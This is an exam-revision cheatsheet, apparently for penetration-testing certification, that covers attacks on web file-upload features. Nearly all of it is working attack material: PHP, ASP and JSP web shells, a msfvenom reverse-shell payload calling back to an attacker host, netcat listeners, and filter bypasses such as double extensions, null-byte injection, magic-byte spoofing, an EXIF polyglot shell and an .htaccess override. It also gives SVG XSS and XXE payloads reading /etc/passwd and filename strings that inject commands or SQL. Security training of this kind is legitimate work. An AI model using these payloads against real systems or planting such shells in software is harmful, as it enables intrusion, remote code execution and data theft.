---
title: 'File Upload — Cheatsheet'
description: 'One-page quick reference for file upload attacks: fingerprinting, web/reverse shells, and every client-side and server-side filter bypass, for last-minute exam revision.'
tags:
  - CPTS
  - Web
  - File Upload
  - Cheatsheet
---

# File Upload — Cheatsheet

!!! tip "Five-minute review"
    Skim this right before the exam. Each block links back to the full lesson if you need depth.

## Methodology (the order that matters)

!!! quote "Decision flow"
    Can I upload any file? → **[Absent validation](absent-validation.md): upload a shell.**
    Blocked in the browser only? → **[Client-side bypass](client-side-validation.md).**
    Server rejects the extension? → **[Blacklist](blacklist-filters.md) / [Whitelist](whitelist-filters.md) bypass.**
    Server checks the file *type*? → **[Content-Type / MIME / magic bytes](type-filters.md).**
    Can't get RCE at all? → **[Limited uploads](limited-uploads.md) (XSS/XXE/SSRF/DoS + filename).**

## Fingerprint the Stack

```shell
# Manual index probe
curl -s http://TARGET/index.php -o /dev/null -w "%{http_code}\n"

# Fuzz extensions
ffuf -w web-extensions.txt:EXT -u http://TARGET/indexFUZZ -mc 200

# Tech detect
whatweb http://TARGET
httpx -u http://TARGET -td
nmap -p80,443 --script=http-enum TARGET
```

Cookie tells: `PHPSESSID` → PHP · `ASP.NET_SessionId` → .NET · `JSESSIONID` → Java.

## Code-Execution Proof (PHP)

```php
<?php echo "Hello World"; ?>
```

Rendered text = RCE. Raw source = stored-only.

## Minimal Web Shells

```php
<?php system($_REQUEST['cmd']); ?>          /* PHP  -> ?cmd=id */
<?php echo shell_exec($_GET['cmd']); ?>     /* PHP fallback func */
```
```asp
<% eval request("cmd") %>                    <%-- Classic ASP --%>
```
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>  <%-- JSP --%>
```

PHP exec functions to try if one is disabled: `system`, `shell_exec`, `exec`, `passthru`, `popen`, `proc_open`.

## Reverse Shells

```shell
msfvenom -p php/reverse_php LHOST=ATTACKER LPORT=4444 -f raw > reverse.php
msfvenom --list payloads | grep reverse        # find more
# or grab a ready payload from https://revshells.com
```

### Listeners

```shell
nc -lvnp 4444
rlwrap nc -lvnp 4444        # history + arrow keys
pwncat-cs -lp 4444          # auto-stabilize + features
socat file:`tty`,raw,echo=0 tcp-listen:4444   # full TTY
```

## Client-Side Bypass

!!! example "Burp (request modify)"
    1. Upload a valid image, intercept the POST to `/upload.php`.
    2. Change `filename="img.png"` → `filename="shell.php"`.
    3. Replace the file body with your web shell.
    4. (Optional) keep `Content-Type: image/png`.
    5. Forward → browse to the uploaded shell.

!!! example "DOM edit"
    1. ++ctrl+shift+c++ → click the upload input.
    2. Delete `onchange="checkFile(this)"` (and `accept="..."`).
    3. Select *All Files* → choose your shell → upload.

## Server-Side Extension Bypass

| Filter | Bypass |
|--------|--------|
| Blacklist | `.phtml .php3 .php5 .php7 .phps .pht .phar`; mixed case `.pHp` (Windows) |
| Whitelist (weak regex) | Double ext `shell.jpg.php` / `shell.php.jpg` |
| Reverse double ext | `FilesMatch`/`AddHandler` executes any name containing `.php` |
| Char injection | `shell.php%00.jpg` · `shell.php;.jpg` · `shell.php%20` · trailing `.` |

## Type / Content Bypass

| Check | Bypass |
|-------|--------|
| `Content-Type` header | Spoof file part to `image/png` in proxy |
| Magic bytes (`finfo`) | Prepend `GIF8` before `<?php` |
| Whole-image parse (`getimagesize`) | EXIF polyglot: `exiftool -Comment='<?php system($_REQUEST["cmd"]);?>' img.jpg` |

Magic bytes: JPEG `FF D8 FF E0` · PNG `89 50 4E 47` · GIF `47 49 46 38` (`GIF8`).

## Limited Uploads (no RCE)

```xml
<!-- SVG stored XSS -->
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>

<!-- SVG XXE -->
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

Filename injection: `../../shell.php` (traversal) · `$(id).jpg` (cmd) · `'-- -.jpg` (SQLi) · `<script>.jpg` (XSS).
`.htaccess` → `AddType application/x-httpd-php .jpg` to execute `shell.jpg`.

## Tooling

| Job | Primary | Alternatives |
|-----|---------|--------------|
| Fingerprint | Wappalyzer | whatweb, httpx, nmap, BuiltWith |
| Ext fuzzing | Burp Intruder | ffuf, wfuzz |
| Intercept/modify | Burp | Caido, ZAP, mitmproxy |
| Web shell | `<?php system($_REQUEST['cmd']);?>` | phpbash, weevely, p0wny |
| Reverse payload | pentestmonkey | revshells.com, msfvenom |
| File type | `file`, `xxd`, `exiftool` | Burp hex view |
| Wordlists | SecLists `/Web-Shells/` | PayloadsAllTheThings |

---

➡️ Back to the [series overview](index.md).
